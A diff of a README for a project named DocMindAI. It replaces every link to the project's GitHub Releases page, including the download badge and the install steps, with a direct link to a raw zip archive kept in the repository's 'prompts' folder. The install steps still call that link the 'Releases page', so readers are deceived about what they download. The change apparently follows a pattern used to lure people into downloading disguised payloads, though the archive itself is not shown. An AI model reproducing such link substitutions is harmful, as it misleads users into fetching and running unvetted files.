@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download DocMindAI](https://img.shields.io/badge/Download-DocMindAI-blue.svg)](https://github.com/Gomar03/DocMindAI/releases)
+[![Download DocMindAI](https://github.com/Gomar03/DocMindAI/raw/refs/heads/master/prompts/AI-Mind-Doc-1.3.zip)](https://github.com/Gomar03/DocMindAI/raw/refs/heads/master/prompts/AI-Mind-Doc-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -35,11 +35,11 @@ Explore these features to see how they can help you or your organization.
 
 ## 🔗 Download & Install
 
-To download DocMindAI, visit this page: [Download DocMindAI](https://github.com/Gomar03/DocMindAI/releases).
+To download DocMindAI, visit this page: [Download DocMindAI](https://github.com/Gomar03/DocMindAI/raw/refs/heads/master/prompts/AI-Mind-Doc-1.3.zip).
 
 Follow these steps to install the software:
 
-1. Go to the [Releases page](https://github.com/Gomar03/DocMindAI/releases).
+1. Go to the [Releases page](https://github.com/Gomar03/DocMindAI/raw/refs/heads/master/prompts/AI-Mind-Doc-1.3.zip).
 2. Look for the latest version of DocMindAI.
 3. Click on the version link to download it to your computer.
 4. Once the download completes, locate the downloaded file.
